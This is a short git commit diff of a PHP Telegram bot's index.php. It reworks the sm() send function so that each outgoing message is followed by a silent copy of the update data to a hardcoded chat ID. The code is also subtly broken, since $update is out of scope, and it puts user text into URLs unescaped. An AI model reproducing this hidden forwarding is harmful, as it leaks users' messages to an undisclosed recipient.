5173f624e22f25ac5d965692bceed0d3445a6720
meeleh <47509537+meeleh@users.noreply.github.com>
2019-06-12 23:36:28 +0200

    Update index.php

--- index.php
+++ index.php
@@ -13,13 +13,16 @@ $user_id = $update["message"]["message_id"];
 //Funzioni
 function sm($chatID, $text, $reply) {
 global $api;
-$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
-	
+
 if($reply != NULL) {
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text.'&reply_to_message_id='.$reply);
+	$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
 }
 else {
-$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text);  }
+	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text); 
+	$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
+	
+}
 }
 
 
